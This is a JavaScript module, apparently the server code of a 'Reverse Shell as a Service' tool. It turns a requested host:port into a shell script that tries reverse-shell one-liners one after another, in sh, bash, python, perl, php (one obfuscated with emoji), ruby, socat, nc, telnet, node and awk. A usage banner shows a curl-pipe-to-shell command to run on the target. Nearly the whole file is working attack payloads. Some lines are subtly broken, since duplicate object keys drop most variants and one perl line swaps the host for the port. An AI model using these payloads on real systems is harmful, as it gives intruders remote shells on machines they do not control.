'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generateScript = (host, port) => {
	const payloads = {
		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`,
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
		bash: `0<&196;exec 196<>/dev/tcp/${host}/${port}; sh <&196 >&196 2>&196`,
		bash: `exec 5<>/dev/tcp/${host}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
		bash: `sh -i 5<> /dev/tcp/${host}/${port} 0<&5 1>&5 2>&5`,
		bash: `sh -i >& /dev/udp/${host}/${port} 0>&1`,
		perl: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
		php: `php -r '$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "${host}";$💻 = ${port};$🐚 = "sh". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'`,
		php: `php -r '$sock=fsockopen("${host}",${port});exec("sh -i <&3 >&3 2>&3");'`,
		php: `php -r '$sock=fsockopen("${host}",${port});shell_exec("sh -i <&3 >&3 2>&3");'`,
		php: `php -r '$sock=fsockopen("${host}",${port});system("sh -i <&3 >&3 2>&3");'`,
		php: `php -r '$sock=fsockopen("${host}",${port});passthru("sh -i <&3 >&3 2>&3");'`,
		php: `php -r '$sock=fsockopen("${host}",${port});popen("sh -i <&3 >&3 2>&3", "r");'`,
		python: `export RHOST="${host}";export RPORT=${port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`,
		python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
		ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'`,
		ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${host}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
		socat: `socat TCP:${host}:${port} EXEC:sh`,
		socat: `socat TCP:${host}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
		telnet: `TF=$(mktemp -u);mkfifo $TF && telnet ${host} ${port} 0<$TF | sh 1>$TF`,
		nodejs: `require('child_process').exec('nc -e sh ${host} ${port}')`,
		awk: `awk 'BEGIN {s = "/inet/tcp/0/${host}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
		script += `

if command -v ${cmd} > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host && port && generateScript(host, port));
};

module.exports = reverseShell;
